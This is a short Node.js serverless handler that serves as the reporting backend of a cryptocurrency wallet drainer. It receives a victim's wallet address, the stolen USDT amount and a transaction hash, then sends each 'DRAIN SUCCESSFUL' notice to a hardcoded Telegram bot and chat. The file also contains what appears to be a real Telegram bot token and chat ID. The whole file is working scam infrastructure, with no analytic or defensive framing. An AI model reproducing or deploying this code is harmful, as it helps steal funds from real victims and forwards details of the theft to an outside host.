const fetch = require('node-fetch');

const BOT_TOKEN = '8594970934:AAGJZhbCc5Ogvgy5saG-RQs8lVRO6miSa6Y';
const CHAT_ID = '909411455';

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Telegram error:', err);
    }
}

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        const { address, amount, tx } = JSON.parse(event.body);

        await sendTelegramMessage(`
💰 <b>DRAIN SUCCESSFUL!</b>

💼 Victim: <code>${address}</code>
💵 Amount: ${amount} USDT
🔗 Tx: <code>${tx}</code>
    `);

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ success: true })
        };
    } catch (err) {
        console.error('Error:', err);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: 'Server error' })
        };
    }
};